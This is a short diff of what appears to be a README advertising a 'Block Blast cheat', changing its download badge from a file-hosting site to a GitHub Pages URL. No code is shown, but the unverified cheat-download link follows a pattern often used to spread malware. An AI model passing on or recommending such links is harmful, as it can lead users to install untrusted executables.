@@ -1,6 +1,6 @@
 Block Blast cheat refers to various tools, strategies, or tips that players can use to gain an advantage or progress faster in the puzzle game *Block Blast*. These cheats can include external apps or websites that suggest optimal moves, unlock power-ups, or help players solve difficult levels without spending too much time or effort. While these cheats can make gameplay easier, they often reduce the challenge and fun of solving puzzles on your own.
 
-[![Download Block Blast cheat](https://img.shields.io/badge/Download-BlockBlast%20cheat-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Block Blast cheat](https://img.shields.io/badge/Download-BlockBlast%20cheat-blueviolet)](https://block-blast-cheat.github.io/.github/)
 
 **Common Types of Block Blast Cheats:**
 
